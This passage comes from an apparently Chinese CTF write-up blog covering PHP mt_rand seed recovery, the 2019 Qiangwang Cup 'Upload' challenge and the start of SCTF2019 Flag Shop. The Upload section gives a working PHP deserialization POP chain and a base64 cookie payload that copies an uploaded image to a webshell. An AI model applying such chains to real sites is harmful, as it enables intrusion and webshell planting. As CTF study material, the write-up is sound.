class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>  &#125;<br>  <span class="hljs-variable">$Public_key</span> = public_key();<br>  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></code></pre></td></tr></table></figure>

<p>两个生成秘钥的函数 然后前面就是验证秘钥的</p>
<p>因为 有 mt_rand 这题大概率还是考察伪随机数</p>
<p>转换为 php_mt_send 可用参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">str1 =<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span><br>str2 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br>res =<span class="hljs-string">&#x27;&#x27;</span><br>length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(str2)-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str1)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str2)):<br>        <span class="hljs-keyword">if</span> str1[i] ==  str2[j]:<br>            res += <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> +<span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span> + length + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(res)<br><br></code></pre></td></tr></table></figure>

<p>获取种子</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201292119597.png" srcset="/img/loading.gif" lazyload alt="image-20220129211942474"></p>
<p>重新生成秘钥</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand(<span class="hljs-number">1775196155</span>);<br><span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">16</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= substr(<span class="hljs-variable">$strings1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$public_key</span>. <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br><span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">12</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= substr(<span class="hljs-variable">$strings2</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$private_key</span>;<br><span class="hljs-comment">//KVQP0LdJKRaV3n9D&lt;br&gt;XuNhoueCDCGc</span><br><br></code></pre></td></tr></table></figure>



<p>注意这里要使用 5.2.1 -7.0.X的版本 你可以使用phpstudy安装旧版本php 然后进文件夹用那个php跑</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201292131105.png" srcset="/img/loading.gif" lazyload alt="image-20220129213104053"></p>
<h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>注册一个账号可以看出是ThinkPHP的框架</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202011004525.png" srcset="/img/loading.gif" lazyload alt="image-20220201100402396"></p>
<p>这里可以上传文件 <code>/index.php/home</code> 这是用Discuz的搭建的，应该有源码</p>
<p>访问 <code>url/www.tar.gz</code> 获取源码</p>
<p>拿到框架以后搜索高危函数</p>
<p>在 <code>controller\Index.php</code> 中存在unserialize函数</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202011030993.png" srcset="/img/loading.gif" lazyload alt="image-20220201103029895"></p>
<p>这里对cookie中的user编码进行反序列化，看看profile的值，是否可控。然后来到profile.php</p>
<p>这里负责实现文件上传的业务逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker=<span class="hljs-keyword">new</span> Index();<br>        <span class="hljs-keyword">$this</span>-&gt;upload_menu=md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        @chdir(<span class="hljs-string">&quot;../public/upload&quot;</span>);<br>        <span class="hljs-keyword">if</span>(!is_dir(<span class="hljs-keyword">$this</span>-&gt;upload_menu))&#123;<br>            @mkdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);<br>        &#125;<br>        @chdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;checker)&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;checker-&gt;login_check())&#123;<br>                <span class="hljs-variable">$curr_url</span>=<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="hljs-string">&quot;/index&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-variable">$curr_url</span>,<span class="hljs-number">302</span>);<br>                <span class="hljs-keyword">exit</span>();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename_tmp=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;filename=md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;ext_check();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext) &#123;<br>            <span class="hljs-keyword">if</span>(getimagesize(<span class="hljs-keyword">$this</span>-&gt;filename_tmp)) &#123;<br>                @copy(<span class="hljs-keyword">$this</span>-&gt;filename_tmp, <span class="hljs-keyword">$this</span>-&gt;filename);<br>                @unlink(<span class="hljs-keyword">$this</span>-&gt;filename_tmp);<br>                <span class="hljs-keyword">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-subst">$this</span>-&gt;upload_menu/<span class="hljs-subst">$this</span>-&gt;filename&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;update_img();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$user_info</span>=db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;ID&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>])-&gt;find();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$user_info</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;img)&#123;<br>            <span class="hljs-keyword">if</span>(db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&#x27;ID&#x27;</span>,<span class="hljs-variable">$user_info</span>[<span class="hljs-string">&#x27;ID&#x27;</span>])-&gt;data([<span class="hljs-string">&quot;img&quot;</span>=&gt;addslashes(<span class="hljs-keyword">$this</span>-&gt;img)])-&gt;update())&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;update_cookie();<br>                <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;Upload img successful!&#x27;</span>, url(<span class="hljs-string">&#x27;../home&#x27;</span>));<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Upload file failed!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_cookie</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&#x27;img&#x27;</span>]=<span class="hljs-keyword">$this</span>-&gt;img;<br>        cookie(<span class="hljs-string">&quot;user&quot;</span>,base64_encode(serialize(<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile)),<span class="hljs-number">3600</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ext_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$ext_arr</span>=explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">$this</span>-&gt;ext=end(<span class="hljs-variable">$ext_arr</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext==<span class="hljs-string">&quot;png&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个 <code>__get</code>和<code>__call</code>怎么触发？</p>
<p>在register.php中发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;registed)&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker-&gt;index();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>registed可控 ，如果给checker一个序列化的Profile就会触发Profile::_call</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>没有参数，然后变成 $this-&gt;index </p>
<p>这是个不可获得属性然后走Profile:: __get()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们令 <code>except[$name]=array(&quot;index&quot;=&gt;&quot;upload_img&quot;)</code> 即访问 index 这个变量，就会返回upload_img这个函数</p>
<p>然后再看upload_img的部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>    ...<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename_tmp=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;filename=md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;ext_check();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext) &#123;<br>            <span class="hljs-keyword">if</span>(getimagesize(<span class="hljs-keyword">$this</span>-&gt;filename_tmp)) &#123;<br>                @copy(<span class="hljs-keyword">$this</span>-&gt;filename_tmp, <span class="hljs-keyword">$this</span>-&gt;filename);   <span class="hljs-comment">//copy两个参数可控，所以filename_tmp是shell内容后者生效的webshell</span><br>                @unlink(<span class="hljs-keyword">$this</span>-&gt;filename_tmp);<br>                <span class="hljs-keyword">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-subst">$this</span>-&gt;upload_menu/<span class="hljs-subst">$this</span>-&gt;filename&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;update_img();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>只要$FILES数组非空就可以直接进下一个if语句，这样只要之前上传过文件就可以解决了</p>
<p>然后再 Index.php发现  反序列化入口 所以我们需要更改 cookie[‘user’]</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$profile</span>=cookie(<span class="hljs-string">&#x27;user&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$profile</span>))&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;profile=unserialize(base64_decode(<span class="hljs-variable">$profile</span>));<br>        <span class="hljs-keyword">$this</span>-&gt;profile_db=db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;ID&quot;</span>,intval(<span class="hljs-keyword">$this</span>-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>]))-&gt;find();<br>        <span class="hljs-keyword">if</span>(array_diff(<span class="hljs-keyword">$this</span>-&gt;profile_db,<span class="hljs-keyword">$this</span>-&gt;profile)==<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>先上传个文件拿到路径</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202082354372.png" srcset="/img/loading.gif" lazyload alt="image-20220208235431147"></p>
<p>给图片添加文件头成功上传，随后重新登录获取文件路径</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">../upload/<span class="hljs-keyword">cc</span><span class="hljs-number">551</span>ab<span class="hljs-number">005</span>b<span class="hljs-number">2e60</span>fbdc<span class="hljs-number">88</span>de<span class="hljs-number">809</span>b<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>b<span class="hljs-number">1</span>/f<span class="hljs-number">3</span>b<span class="hljs-number">94e88</span>bd<span class="hljs-number">1</span>bd<span class="hljs-number">325</span>af<span class="hljs-number">6</span>f<span class="hljs-number">62828</span><span class="hljs-keyword">c</span><span class="hljs-number">8785</span>dd.png<br></code></pre></td></tr></table></figure>

<p>构建exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$registed</span> =<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span> =<span class="hljs-number">0</span> ;<span class="hljs-comment">//目的是绕过index类的检查，防止退出程序</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>=<span class="hljs-string">&quot;./upload/cc551ab005b2e60fbdc88de809b2c4b1/f3b94e88bd1bd325af6f62828c8785dd.png&quot;</span>;  <span class="hljs-comment">//webshell</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;upload/shell.php&quot;</span>;  <span class="hljs-comment">//shell地址</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>=<span class="hljs-number">1</span>;  <span class="hljs-comment">//直接进入file_exist的下一个循环</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;index&quot;</span>=&gt;<span class="hljs-string">&quot;upload_img&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Register();<br><span class="hljs-variable">$a</span>-&gt;checker = <span class="hljs-keyword">new</span> Profile();<br><span class="hljs-variable">$a</span>-&gt;checker-&gt;checker=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2NjNTUxYWIwMDViMmU2MGZiZGM4OGRlODA5YjJjNGIxL2YzYjk0ZTg4YmQxYmQzMjVhZjZmNjI4MjhjODc4NWRkLnBuZyI7czoxMToidXBsb2FkX21lbnUiO047czo4OiJmaWxlbmFtZSI7czoxNzoidXBsb2FkL3BlbnNvbi5waHAiO3M6MzoiZXh0IjtpOjE7czozOiJpbWciO047czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czoxMDoidXBsb2FkX2ltZyI7fX1zOjg6InJlZ2lzdGVkIjtpOjA7fQ==</span><br></code></pre></td></tr></table></figure>

<p>然后修改cookie[user] 为上一步的结果</p>
<p>来到创建的 &#x2F;upload&#x2F;shell.php 随后蚁剑连接就好</p>
<h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p> 商店类题目，robots.txt 里指向的文件存在泄露的源码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = JWT.decode cookies[:auth],ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  unless params[:SECRET].nil?<br>    <span class="hljs-keyword">if</span> ENV[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;</span>)<br>      puts ENV[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    end<br>  end<br><br></code></pre></td></tr></table></figure>

<p>同时在cookie中发现jwt</p>
